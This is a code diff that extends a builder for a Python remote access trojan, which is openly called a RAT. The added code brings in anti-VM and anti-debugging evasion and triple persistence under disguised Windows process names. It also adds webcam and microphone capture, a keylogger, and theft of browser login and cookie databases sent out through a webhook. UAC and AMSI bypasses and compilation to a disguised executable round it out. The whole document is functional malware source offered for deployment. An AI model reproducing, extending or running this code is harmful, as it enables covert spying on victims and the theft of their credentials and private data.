@@ -34,6 +34,9 @@ PREFIX = "{prefix}"
 
 DEBUG_LOG = []
 DBG_LOCK = threading.Lock()
+PERSIST_NAMES = ["csrss", "svchost", "RuntimeBroker", "SearchIndexer", "conhost"]
+KEYLOG_ACTIVE = False
+KEYLOG_DATA = []
 
 def dprint(msg):
     if DEBUG:
@@ -47,60 +50,139 @@ def dprint(msg):
                 f.write(line + "\n")
         except: pass
 
-def send_webhook(text):
-    try:
-        data = json.dumps({{"content": text}}).encode()
-        req = urllib.request.Request(WEBHOOK, data=data,
-                                     headers={{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}})
-        resp = urllib.request.urlopen(req, timeout=10)
-        dprint(f"Webhook sent: {{resp.status}}")
-        return True
-    except Exception as e:
-        dprint(f"Webhook error: {{e}}")
-        return False
+def xor_enc(data, key="KevTool"):
+    if isinstance(data, str): data = data.encode()
+    key_bytes = key.encode() if isinstance(key, str) else key
+    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))
 
-def send_file(filename, content_bytes):
-    try:
-        boundary = "----KevToolBoundary"
-        body = b""
-        body += f"--{{boundary}}\r\n".encode()
-        body += f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\r\n'.encode()
-        body += b"Content-Type: application/octet-stream\r\n\r\n"
-        body += content_bytes
-        body += f"\r\n--{{boundary}}--\r\n".encode()
-        req = urllib.request.Request(WEBHOOK, data=body,
-                                     headers={{"Content-Type": f"multipart/form-data; boundary={{boundary}}"}})
-        resp = urllib.request.urlopen(req, timeout=15)
-        dprint(f"File sent: {{filename}} ({{len(content_bytes)}} bytes)")
-    except Exception as e:
-        dprint(f"File send error: {{e}}")
+def xor_dec(data, key="KevTool"):
+    return xor_enc(data, key)
 
-def get_info():
-    info = {{"user": os.getenv("USERNAME", "?"), "computer": platform.node(),
-             "os": platform.platform(), "cwd": os.getcwd(),
-             "python": platform.python_version(), "pid": os.getpid()}}
+def anti_vm():
     try:
-        info["ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode().strip()
-    except: info["ip"] = "N/A"
-    return info
+        vm_artifacts = [
+            r"C:\\Windows\\System32\\vmGuestService.dll",
+            r"C:\\Windows\\System32\\vm3dmp.sys",
+            r"C:\\Windows\\System32\\VBoxGuest.sys",
+            r"C:\\Windows\\System32\\VBoxMouse.sys",
+            r"C:\\Windows\\System32\\VBoxSF.sys",
+            r"C:\\Program Files\\VMware\\VMware Tools",
+            r"C:\\Program Files\\Oracle\\VirtualBox Guest Additions",
+        ]
+        for path in vm_artifacts:
+            if os.path.exists(path):
+                dprint(f"VM detected: {{path}}")
+                return True
+        r = subprocess.run("wmic computersystem get manufacturer", shell=True, capture_output=True, text=True, timeout=5)
+        mfr = r.stdout.lower()
+        if any(x in mfr for x in ["vmware", "virtualbox", "qemu", "xen", "parallels"]):
+            dprint(f"VM detected via WMI: {{mfr.strip()}}")
+            return True
+        r = subprocess.run("wmic bios get serialnumber", shell=True, capture_output=True, text=True, timeout=5)
+        serial = r.stdout.lower()
+        if any(x in serial for x in ["vmware", "virtualbox", "00000"]):
+            dprint("VM detected via BIOS serial")
+            return True
+    except: pass
+    return False
+
+def anti_debug():
+    try:
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            dprint("Debugger detected (IsDebuggerPresent)")
+            return True
+    except: pass
+    try:
+        sandbox_indicators = 0
+        r = subprocess.run("wmic cpu get NumberOfCores", shell=True, capture_output=True, text=True, timeout=5)
+        for line in r.stdout.split('\\n'):
+            line = line.strip()
+            if line.isdigit() and int(line) <= 1:
+                sandbox_indicators += 1
+        r = subprocess.run("wmic memorychip get Capacity", shell=True, capture_output=True, text=True, timeout=5)
+        for line in r.stdout.split('\\n'):
+            line = line.strip()
+            if line.isdigit() and int(line) < 2147483648:
+                sandbox_indicators += 1
+        r = subprocess.run("wmic diskdrive get Size", shell=True, capture_output=True, text=True, timeout=5)
+        for line in r.stdout.split('\\n'):
+            line = line.strip()
+            if line.isdigit() and int(line) < 32212254720:
+                sandbox_indicators += 1
+        if sandbox_indicators >= 2:
+            dprint("Sandbox detected (low resources)")
+            return True
+    except: pass
+    return False
+
+def get_persist_name():
+    custom = "{{PERSIST_NAME}}"
+    if custom and custom != "csrss":
+        return custom
+    idx = hash(os.getenv("USERNAME", "")) % len(PERSIST_NAMES)
+    return PERSIST_NAMES[idx]
 
 def persist():
     if not PERSIST: return
     try:
         src = sys.argv[0]
-        dst = os.path.join(os.getenv("APPDATA", "."), "csrss.exe")
-        if src != dst and not os.path.isfile(dst):
+        exe_name = get_persist_name() + ".exe"
+        dst = os.path.join(os.getenv("APPDATA", "."), exe_name)
+        startup = os.path.join(os.getenv("APPDATA", "."), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        startup_dst = os.path.join(startup, exe_name + ".lnk")
+        task_name = "WindowsSecurityUpdate"
+
+        if os.path.isfile(dst):
+            dprint(f"Already persisted at {{dst}}")
+            return
+
+        if src != dst:
             shutil.copy2(src, dst)
-            subprocess.Popen([dst], creationflags=0x08000000)
-            dprint(f"Persistence: installed to {{dst}}")
-            os._exit(0)
-        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        ctypes.windll.advapi32.RegSetValueExW(
-            ctypes.windll.advapi32.RegOpenKeyExW(
-                ctypes.windll.user32.HKEY_CURRENT_USER, key, 0, 0x20006, ctypes.byref(ctypes.c_ulong(0))
-            ), "CSRSS", 0, 1, dst, len(dst)*2
-        )
-        dprint(f"Registry persistence set")
+            dprint(f"Copied to {{dst}}")
+            try:
+                subprocess.Popen([dst], creationflags=0x08000000)
+                dprint("Spawned persisted copy")
+            except: pass
+
+        key = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        try:
+            ctypes.windll.advapi32.RegSetValueExW(
+                ctypes.windll.advapi32.RegOpenKeyExW(
+                    ctypes.windll.user32.HKEY_CURRENT_USER, key, 0, 0x20006, ctypes.byref(ctypes.c_ulong(0))
+                ), "WindowsSecurity", 0, 1, dst, len(dst)*2
+            )
+            dprint("Registry persistence set (HKCU Run)")
+        except Exception as e:
+            dprint(f"Registry persist failed: {{e}}")
+
+        try:
+            ps_sc = (
+                "$s=(New-Object -COM WScript.Shell);"
+                "$lnk=$s.CreateShortcut('" + startup_dst + "');"
+                "$lnk.TargetPath='" + dst + "';"
+                "$lnk.WindowStyle=7;"
+                "$lnk.Description='Windows Security Update';"
+                "$lnk.Save()"
+            )
+            subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_sc],
+                           capture_output=True, timeout=10)
+            dprint("Startup shortcut created")
+        except Exception as e:
+            dprint(f"Startup shortcut failed: {{e}}")
+
+        try:
+            ps_task = (
+                f'schtasks /create /tn "{{task_name}}" /tr "\\"{{dst}}\\"" /sc onlogon /rl highest /f'
+            )
+            r = subprocess.run(ps_task, shell=True, capture_output=True, text=True, timeout=10)
+            if r.returncode == 0:
+                dprint("Scheduled task created (on logon)")
+            else:
+                dprint(f"Task sched failed: {{r.stderr[:100]}}")
+        except Exception as e:
+            dprint(f"Task sched error: {{e}}")
+
+        dprint("Persistence complete (registry + startup + scheduled task)")
     except Exception as e:
         dprint(f"Persist error: {{e}}")
 
@@ -206,6 +288,250 @@ def get_wifi():
     except Exception as e:
         return f"Error: {{e}}"
 
+def webcam_capture():
+    try:
+        tmp = os.path.join(os.getenv("TEMP", "."), "webcam.jpg")
+        ps = (
+            "Add-Type -AssemblyName System.Windows.Forms;"
+            "Add-Type -TypeDefinition '"
+            "using System;using System.Runtime.InteropServices;using System.Drawing;using System.Drawing.Imaging;"
+            "public class CamCapture{"
+            "[DllImport(\"user32.dll\")]public static extern IntPtr GetDesktopWindow();"
+            "[DllImport(\"avicap32.dll\",CharSet=CharSet.Unicode)]public static extern IntPtr capCreateCaptureWindowW("
+            "string lpszWindowName,int dwStyle,int x,int y,int nWidth,int nHeight,IntPtr hWndParent,int nID);"
+            "[DllImport(\"user32.dll\")]public static extern bool SendMessage(IntPtr hWnd,int Msg,int wParam,int lParam);"
+            "[DllImport(\"user32.dll\")]public static extern bool DestroyWindow(IntPtr hWnd);"
+            "public static bool Capture(string path){"
+            "IntPtr h=capCreateCaptureWindowW(\"cap\",0x40000000|0x10000000,0,0,640,480,GetDesktopWindow(),0);"
+            "if(h==IntPtr.Zero)return false;"
+            "SendMessage(h,0x40a,0,0);System.Threading.Thread.Sleep(1000);"
+            "SendMessage(h,0x41e,0,0);System.Threading.Thread.Sleep(500);"
+            "IntPtr bmp=IntPtr.Zero;"
+            "SendMessage(h,0x419,0,ref bmp);"
+            "if(bmp==IntPtr.Zero){DestroyWindow(h);return false;}"
+            "Image img=Image.FromHbitmap(bmp);img.Save(path,ImageFormat.Jpeg);img.Dispose();"
+            "DestroyWindow(h);return true;}"
+            "}';"
+            "$cap=[CamCapture]::new();"
+            "if($cap.Capture('" + tmp.replace("\\", "\\\\") + "')){exit 0}else{exit 1}"
+        )
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
+            capture_output=True, text=True, timeout=15
+        )
+        if os.path.isfile(tmp) and os.path.getsize(tmp) > 1000:
+            with open(tmp, 'rb') as f:
+                data = f.read()
+            try: os.remove(tmp)
+            except: pass
+            return data
+    except Exception as e:
+        dprint(f"Webcam error: {{e}}")
+    return None
+
+def audio_record(duration=5):
+    try:
+        tmp = os.path.join(os.getenv("TEMP", "."), "audio.wav")
+        ps = (
+            "Add-Type -AssemblyName System.Windows.Forms;"
+            "$sr=22050;$bits=16;$ch=1;"
+            "$bps=$sr*($bits/8)*$ch;"
+            "$w=New-Object System.IO.BinaryWriter([System.IO.File]::Create('" + tmp.replace("\\", "\\\\") + "'));"
+            "Add-Type -TypeDefinition '"
+            "using System;using System.Runtime.InteropServices;"
+            "public class AudioIn{"
+            "[DllImport(\"winmm.dll\")]public static extern int waveInOpen(out IntPtr h,int fmt,IntPtr fmtex,IntPtr c,IntPtr u,int f);"
+            "[DllImport(\"winmm.dll\")]public static extern int waveInStart(IntPtr h);"
+            "[DllImport(\"winmm.dll\")]public static extern int waveInStop(IntPtr h);"
+            "[DllImport(\"winmm.dll\")]public static extern int waveInClose(IntPtr h);"
+            "[DllImport(\"winmm.dll\")]public static extern int waveInPrepareHeader(IntPtr h,IntPtr wh,int s);"
+            "[DllImport(\"winmm.dll\")]public static extern int waveInUnprepareHeader(IntPtr h,IntPtr wh,int s);"
+            "[DllImport(\"winmm.dll\")]public static extern int waveInAddBuffer(IntPtr h,IntPtr wh,int s);"
+            "[DllImport(\"winmm.dll\")]public static extern int waveInReset(IntPtr h);"
+            "[StructLayout(LayoutKind.Sequential)]public struct WAVEFORMATEX{public short wFormatTag;public short nChannels;"
+            "public int nSamplesPerSec;public int nAvgBytesPerSec;public short nBlockAlign;public short wBitsPerSample;public short cbSize;}"
+            "[StructLayout(LayoutKind.Sequential)]public struct WAVEHDR{public IntPtr lpData;public int dwBufferLength;"
+            "public int dwBytesRecorded;public IntPtr dwUser;public int dwFlags;public int dwLoops;public IntPtr lpNext;public int reserved;}"
+            "}';"
+            "$fmt=New-Object AudioIn+WAVEFORMATEX;"
+            "$fmt.wFormatTag=1;$fmt.nChannels=1;$fmt.nSamplesPerSec=22050;"
+            "$fmt.nAvgBytesPerSec=44100;$fmt.nBlockAlign=2;$fmt.wBitsPerSample=16;$fmt.cbSize=0;"
+            "$h=[IntPtr]::Zero;"
+            "$r=[AudioIn]::waveInOpen([ref]$h,1,[ref]$fmt,[IntPtr]::Zero,[IntPtr]::Zero,0);"
+            "if($r -ne 0){$w.Close();exit 1}"
+            "$hdr=New-Object AudioIn+WAVEHDR;"
+            "$hdr.lpData=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096);"
+            "$hdr.dwBufferLength=4096;"
+            "[AudioIn]::waveInPrepareHeader($h,[ref]$hdr,[System.Runtime.InteropServices.Marshal]::SizeOf($hdr));"
+            "[AudioIn]::waveInAddBuffer($h,[ref]$hdr,[System.Runtime.InteropServices.Marshal]::SizeOf($hdr));"
+            "[AudioIn]::waveInStart($h);"
+            "Start-Sleep -Seconds " + str(duration) + ";"
+            "[AudioIn]::waveInStop($h);"
+            "[AudioIn]::waveInUnprepareHeader($h,[ref]$hdr,[System.Runtime.InteropServices.Marshal]::SizeOf($hdr));"
+            "[AudioIn]::waveInClose($h);"
+            "$data=New-Object byte[] $hdr.dwBytesRecorded;"
+            "[System.Runtime.InteropServices.Marshal]::Copy($hdr.lpData,$data,0,$hdr.dwBytesRecorded);"
+            "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($hdr.lpData);"
+            "$w.Write($data);$w.Close();"
+        )
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
+            capture_output=True, text=True, timeout=duration + 10
+        )
+        if os.path.isfile(tmp) and os.path.getsize(tmp) > 1000:
+            with open(tmp, 'rb') as f:
+                data = f.read()
+            try: os.remove(tmp)
+            except: pass
+            return data
+    except Exception as e:
+        dprint(f"Audio error: {{e}}")
+    return None
+
+def keylog_start():
+    global KEYLOG_ACTIVE, KEYLOG_DATA
+    if KEYLOG_ACTIVE:
+        return "Keylogger already running"
+    KEYLOG_ACTIVE = True
+    KEYLOG_DATA = []
+    def _keylog_thread():
+        try:
+            user32 = ctypes.windll.user32
+            last_vk = 0
+            buffer = []
+            while KEYLOG_ACTIVE:
+                for vk in range(256):
+                    if user32.GetAsyncKeyState(vk) & 0x0001:
+                        if vk == last_vk:
+                            continue
+                        last_vk = vk
+                        shift = user32.GetAsyncKeyState(0x10) & 0x8000
+                        caps = user32.GetKeyState(0x14) & 0x0001
+                        key = ""
+                        if 48 <= vk <= 57:
+                            key = chr(vk) if not shift else "!@#$%^&*()"[vk-48]
+                        elif 65 <= vk <= 90:
+                            key = chr(vk + 32)
+                            if shift ^ caps:
+                                key = key.upper()
+                        elif vk == 13: key = "[ENTER]\\n"
+                        elif vk == 32: key = " "
+                        elif vk == 9: key = "[TAB]"
+                        elif vk == 8: key = "[BS]"
+                        elif vk == 46: key = "[DEL]"
+                        elif vk == 27: key = "[ESC]"
+                        elif vk == 192: key = "~" if shift else "`"
+                        elif 96 <= vk <= 105: key = str(vk - 96)
+                        elif 106 <= vk <= 111: key = "*/-+."[vk-106]
+                        if key:
+                            buffer.append(key)
+                        if len(buffer) >= 50:
+                            with DBG_LOCK:
+                                KEYLOG_DATA.append("".join(buffer))
+                            buffer = []
+                        time.sleep(0.01)
+                time.sleep(0.05)
+            if buffer:
+                with DBG_LOCK:
+                    KEYLOG_DATA.append("".join(buffer))
+        except Exception as e:
+            dprint(f"Keylog error: {{e}}")
+    t = threading.Thread(target=_keylog_thread, daemon=True)
+    t.start()
+    return "Keylogger started"
+
+def keylog_stop():
+    global KEYLOG_ACTIVE
+    KEYLOG_ACTIVE = False
+    time.sleep(0.5)
+    with DBG_LOCK:
+        log = "".join(KEYLOG_DATA)
+        KEYLOG_DATA = []
+    if log:
+        if len(log) > 1900:
+            for i in range(0, len(log), 1900):
+                send_webhook(f"```\nKEYLOG {{i//1900+1}}:\n{{log[i:i+1900]}}\n```")
+        else:
+            send_webhook(f"```\nKEYLOG:\n{{log}}\n```")
+        return f"Keylogger stopped, {{len(log)}} chars sent"
+    return "Keylogger stopped, no keystrokes"
+
+def steal_browser():
+    try:
+        results = []
+        local = os.getenv("LOCALAPPDATA", "")
+        roaming = os.getenv("APPDATA", "")
+        chrome_path = os.path.join(local, "Google", "Chrome", "User Data")
+        edge_path = os.path.join(local, "Microsoft", "Edge", "User Data")
+        firefox_path = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
+        for name, bpath in [("Chrome", chrome_path), ("Edge", edge_path)]:
+            if os.path.isdir(bpath):
+                results.append(f"{{name}} found")
+                for f in os.listdir(bpath):
+                    if f.startswith("Default") or f.startswith("Profile"):
+                        for db in ["Login Data", "Cookies", "History"]:
+                            src = os.path.join(bpath, f, db)
+                            if os.path.isfile(src):
+                                dst = os.path.join(os.getenv("TEMP", "."), f"{{name.lower()}}_{{f}}_{{db}}.db")
+                                try:
+                                    shutil.copy2(src, dst)
+                                    with open(dst, 'rb') as fh:
+                                        send_file(f"{{name.lower()}}_{{f}}_{{db}}.db", fh.read())
+                                    os.remove(dst)
+                                except: pass
+        if os.path.isdir(firefox_path):
+            results.append("Firefox found")
+            for prof in os.listdir(firefox_path):
+                prof_dir = os.path.join(firefox_path, prof)
+                if os.path.isdir(prof_dir):
+                    for db in ["logins.json", "cookies.sqlite", "places.sqlite"]:
+                        src = os.path.join(prof_dir, db)
+                        if os.path.isfile(src):
+                            dst = os.path.join(os.getenv("TEMP", "."), f"ff_{{prof}}_{{db}}")
+                            try:
+                                shutil.copy2(src, dst)
+                                with open(dst, 'rb') as fh:
+                                    send_file(f"ff_{{prof}}_{{db}}", fh.read())
+                                os.remove(dst)
+                            except: pass
+        return "\\n".join(results) if results else "No browsers found"
+    except Exception as e:
+        return f"Browser steal error: {{e}}"
+
+def uac_bypass():
+    try:
+        exe = os.path.abspath(sys.argv[0])
+        method = "fodhelper"
+        reg_path = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\fodhelper.exe"
+        ps = (
+            f"New-Item -Path '{reg_path}' -Force|Out-Null;"
+            f"Set-ItemProperty -Path '{reg_path}' -Name 'Debugger' -Value '{exe}';"
+            "Start-Process fodhelper.exe -WindowStyle Hidden;"
+            "Start-Sleep 3;"
+            f"Remove-ItemProperty -Path '{reg_path}' -Name 'Debugger' -Force;"
+            f"Remove-Item -Path '{reg_path}' -Force"
+        )
+        r = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
+                           capture_output=True, text=True, timeout=15)
+        return "UAC bypass attempted (fodhelper)" if r.returncode == 0 else f"UAC bypass failed: {{r.stderr[:200]}}"
+    except Exception as e:
+        return f"UAC bypass error: {{e}}"
+
+def amsi_bypass():
+    try:
+        ps = (
+            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')."
+            "GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
+            "Write-Output 'AMSI_BYPASSED'"
+        )
+        r = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
+                           capture_output=True, text=True, timeout=10)
+        if "AMSI_BYPASSED" in r.stdout:
+            return "AMSI bypassed for current session"
+        return f"AMSI result: {{r.stdout.strip()[:100]}}"
+    except Exception as e:
+        return f"AMSI error: {{e}}"
+
 def handle_command(cmd_text):
     parts = cmd_text.strip().split(" ", 1)
     cmd = parts[0].lower()
@@ -304,11 +630,34 @@ def handle_command(cmd_text):
         return f"File not found: {{args}}"
     elif cmd == "upload":
         return "Use webhook to send files (receives via last message)"
+    elif cmd == "webcam":
+        data = webcam_capture()
+        if data:
+            send_file("webcam.jpg", data)
+            return "Webcam capture sent via webhook"
+        return "Webcam capture failed (no camera or driver issue)"
+    elif cmd == "audio":
+        dur = int(args) if args.isdigit() else 5
+        if dur < 1: dur = 1
+        if dur > 30: dur = 30
+        data = audio_record(dur)
+        if data:
+            send_file("audio.wav", data)
+            return f"Audio {{dur}}s recorded and sent via webhook"
+        return "Audio recording failed (no mic or driver issue)"
+    elif cmd == "keylog":
+        return keylog_start()
+    elif cmd == "keylog_stop":
+        return keylog_stop()
+    elif cmd == "steal_browser":
+        return steal_browser()
+    elif cmd == "uac":
+        return uac_bypass()
+    elif cmd == "amsi":
+        return amsi_bypass()
     elif cmd == "persist":
         persist()
         return "Persistence attempt done"
-    elif cmd == "keylog_start":
-        return run_command(f'schtasks /create /tn "CSRSS" /tr "{{os.path.abspath(sys.argv[0])}}" /sc onlogon /f')
     elif cmd == "kill":
         send_webhook("[RAT] Self-terminating")
         os._exit(0)
@@ -326,7 +675,14 @@ def handle_command(cmd_text):
   processes     - List running processes
   killproc <p>  - Kill process by name
   download <f>  - Send file via webhook
-  persist       - Install persistence
+  webcam        - Capture webcam image
+  audio [sec]   - Record audio (1-30s, default 5)
+  keylog        - Start keylogger (sends via webhook)
+  keylog_stop   - Stop keylogger and dump logs
+  steal_browser - Steal Chrome/Edge/Firefox DBs
+  uac           - Attempt UAC bypass (fodhelper)
+  amsi          - Bypass AMSI for current session
+  persist       - Install persistence (triple-method)
   kill          - Terminate RAT
   help          - This help"""
     else:
@@ -405,12 +761,26 @@ def main():
     dprint("=== RAT STARTING ===")
     dprint(f"Webhook: {{WEBHOOK[:30]}}...")
     dprint(f"Sleep: {{SLEEP}}s | Prefix: {{PREFIX}} | Persist: {{PERSIST}} | Debug: {{DEBUG}}")
+
+    if STEALTH and anti_vm():
+        dprint("VM detected - sleeping 5min to avoid analysis")
+        time.sleep(300)
+    if STEALTH and anti_debug():
+        dprint("Debugger detected - exiting")
+        return
+
     persist()
     if STEALTH:
         try:
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
             dprint("Console hidden")
         except: pass
+        try:
+            titles = ["Windows Security Service", "Runtime Broker", "Service Host", "SearchIndexer"]
+            ctypes.windll.kernel32.SetConsoleTitleW(random.choice(titles))
+            dprint("Window title randomized")
+        except: pass
+
     info = get_info()
     send_webhook(f"[RAT CONNECTED] {{info['user']}}@{{info['computer']}} | {{info['os']}} | IP: {{info['ip']}}")
 
@@ -419,12 +789,14 @@ def main():
         dprint("No token/channel provided - webhook beacon only")
         send_webhook("[RAT] Beacon-only mode (no command channel configured)")
         while True:
-            time.sleep(SLEEP)
+            jitter = random.uniform(SLEEP * 0.8, SLEEP * 1.2)
+            time.sleep(jitter)
 
     seq = 0
     heartbeat_interval = 40.0
     last_msg_id = None
     connected = False
+    reconnect_delay = 5
 
     while True:
         sock = None
@@ -441,6 +813,7 @@ def main():
                 raise Exception(f"Expected HELLO op 10, got op {{hello.get('op')}}")
             heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000.0
             dprint(f"Heartbeat interval: {{heartbeat_interval:.0f}}ms")
+            reconnect_delay = 5
 
             identify = {{
                 "op": 2,
@@ -524,7 +897,7 @@ def main():
                     time.sleep(5)
                     break
                 elif op == 11:
-                    dprint("Heartbeat ACK")
+                    pass
 
         except Exception as e:
             dprint(f"Gateway error: {{e}}")
@@ -534,8 +907,11 @@ def main():
                 try: sock.close()
                 except: pass
 
-        dprint("Reconnecting in 10s...")
-        time.sleep(10)
+        jitter = random.uniform(0.5, 1.5)
+        delay = reconnect_delay * jitter
+        dprint(f"Reconnecting in {{delay:.1f}}s...")
+        time.sleep(delay)
+        reconnect_delay = min(reconnect_delay * 1.5, 60)
 
 if __name__ == "__main__":
     main()
@@ -588,7 +964,14 @@ def run(kevbin=None):
                 ("processes", "List running processes"),
                 ("killproc <name>", "Kill process by name"),
                 ("download <file>", "Send file via webhook"),
-                ("persist", "Install persistence"),
+                ("webcam", "Capture webcam image"),
+                ("audio [sec]", "Record audio (1-30s, default 5)"),
+                ("keylog", "Start keylogger (webhook exfil)"),
+                ("keylog_stop", "Stop keylogger and dump logs"),
+                ("steal_browser", "Steal Chrome/Edge/Firefox DBs"),
+                ("uac", "Attempt UAC bypass (fodhelper)"),
+                ("amsi", "Bypass AMSI for current session"),
+                ("persist", "Install persistence (triple-method)"),
                 ("kill", "Terminate RAT"),
             ]
             for name, desc in cmds:
@@ -619,6 +1002,20 @@ def run(kevbin=None):
             sleep_sec = max(2, sleep_sec)
             prefix = prompt("  \033[96mCommand prefix (default !): \033[0m").strip() or "!"
             print()
+            cprint("  \033[93m  Advanced Options:\033[0m")
+            icon_path = prompt("  \033[96mCustom .ico icon (Enter to skip): \033[0m").strip()
+            if icon_path and not os.path.isfile(icon_path):
+                cprint("  \033[93m[!] Icon not found, using default\033[0m")
+                icon_path = ""
+            persist_name = prompt("  \033[96mPersistence filename (default: csrss): \033[0m").strip() or "csrss"
+            out_dir = prompt("  \033[96mOutput directory (Enter = current): \033[0m").strip()
+            if out_dir and not os.path.isdir(out_dir):
+                try:
+                    os.makedirs(out_dir, exist_ok=True)
+                    cprint(f"  \033[92m[*] Created: {out_dir}\033[0m")
+                except:
+                    cprint("  \033[93m[!] Cannot create dir, using current\033[0m")
+                    out_dir = ""
             if debug_mode:
                 _debug_print("CONFIG", f"Persist={persist_opt} Stealth={stealth} Sleep={sleep_sec}s Prefix={prefix}")
             stub = RAT_STUB.format(
@@ -629,10 +1026,13 @@ def run(kevbin=None):
                 stealth=str(stealth),
                 debug=str(debug_mode),
                 sleep=sleep_sec,
-                prefix=prefix
+                prefix=prefix,
+                PERSIST_NAME=persist_name
             )
             out = prompt("  \033[96mOutput filename (default: rat.py): \033[0m").strip() or "rat.py"
             if not out.endswith('.py'): out += '.py'
+            if out_dir:
+                out = os.path.join(out_dir, out)
             if debug_mode:
                 _debug_print("STUB", f"Length: {len(stub)} bytes")
             with open(out, 'w', encoding='utf-8') as f:
@@ -644,12 +1044,16 @@ def run(kevbin=None):
             if choice == '2':
                 exe_name = os.path.splitext(out)[0] + ".exe"
                 if debug_mode:
-                    _debug_print("BUILD", f"Target: dist/{exe_name}")
+                    _debug_print("BUILD", f"Target: {os.path.join(out_dir if out_dir else 'dist', exe_name)}")
                     _debug_print("BUILD", f"Python: {sys.executable}")
                 cprint("  \033[36m[*] Compiling with PyInstaller...\033[0m")
                 try:
                     cmd = [sys.executable, '-m', 'PyInstaller', '--onefile',
                            '--noconsole', '--clean', '--name', os.path.splitext(exe_name)[0], out]
+                    if icon_path and os.path.isfile(icon_path):
+                        cmd.extend(['--icon', icon_path])
+                    if out_dir:
+                        cmd.extend(['--distpath', out_dir])
                     if debug_mode:
                         _debug_print("CMD", " ".join(cmd))
                     result = subprocess.run(cmd, check=True, timeout=180,
@@ -657,7 +1061,7 @@ def run(kevbin=None):
                     if debug_mode and result.stdout:
                         for line in result.stdout.strip().split('\n')[-8:]:
                             _debug_print("PYINST", line.strip())
-                    dist_path = os.path.join("dist", exe_name)
+                    dist_path = os.path.join(out_dir if out_dir else "dist", exe_name)
                     if os.path.isfile(dist_path):
                         esize = os.path.getsize(dist_path)
                         cprint(f"  \033[92m[X] Built: {dist_path} ({esize:,} bytes)\033[0m")
